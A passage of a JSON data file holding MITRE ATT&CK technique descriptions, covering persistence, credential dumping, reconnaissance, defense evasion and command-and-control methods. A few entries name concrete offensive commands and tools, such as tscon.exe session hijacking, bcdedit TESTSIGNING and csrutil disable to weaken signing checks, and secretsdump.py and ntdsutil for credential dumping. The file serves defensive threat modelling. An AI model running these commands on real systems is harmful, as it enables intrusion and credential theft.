    "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)"
  ],
  "create or modify system process: launch daemon": [
    "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)"
  ],
  "hijack execution flow: dynamic linker hijacking": [
    "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) "
  ],
  "archive collected data: archive via library": [
    "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism."
  ],
  "brute force: password cracking": [
    "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access."
  ],
  "obfuscated files or information: compile after delivery": [
    "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)"
  ],
  "obtain capabilities: digital certificates": [
    "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control."
  ],
  "gather victim identity information: employee names": [
    "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078))."
  ],
  "search victim-owned websites": [
    "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566))."
  ],
  "boot or logon autostart execution": [
    "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges."
  ],
  "remote service session hijacking: rdp hijacking": [
    "Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)"
  ],
  "supply chain compromise: compromise software dependencies and development tools": [
    "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. "
  ],
  "hide artifacts: run virtual instance": [
    "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)"
  ],
  "os credential dumping: ntds": [
    "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n"
  ],
  "compromise accounts: email accounts": [
    "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566). Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest."
  ],
  "phishing for information: spearphishing attachment": [
    "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures."
  ],
  "valid accounts: cloud accounts": [
    "Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship](https://attack.mitre.org/techniques/T1199). Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.\n\nOnce a cloud account is compromised, an adversary may perform [Account Manipulation](https://attack.mitre.org/techniques/T1098) - for example, by adding [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) - to maintain persistence and potentially escalate their privileges."
  ],
  "os credential dumping: cached domain credentials": [
    "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\n\nWith SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)"
  ],
  "web service: one-way communication": [
    "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection."
  ],
  "search open websites/domains: social media": [
    "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
  ],
  "subvert trust controls: code signing policy modification": [
    "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)"
  ],
  "credentials from password stores: password managers": [
    "Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)\n Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)"
  ],
  "gather victim network information: domain properties": [
    "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566))."
  ],
  "gather victim org information": [
    "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "gather victim org information: business relationships": [
    "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "gather victim host information: software": [
    "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "stage capabilities: upload tool": [
    "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool."
  ],
  "virtualization/sandbox evasion: user activity based checks": [
    "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) "
  ],
  "dynamic resolution: fast flux dns": [
    "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel."
  ],
  "execution guardrails: environmental keying": [
    "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful."
  ],
  "obfuscated files or information: indicator removal from tools": [
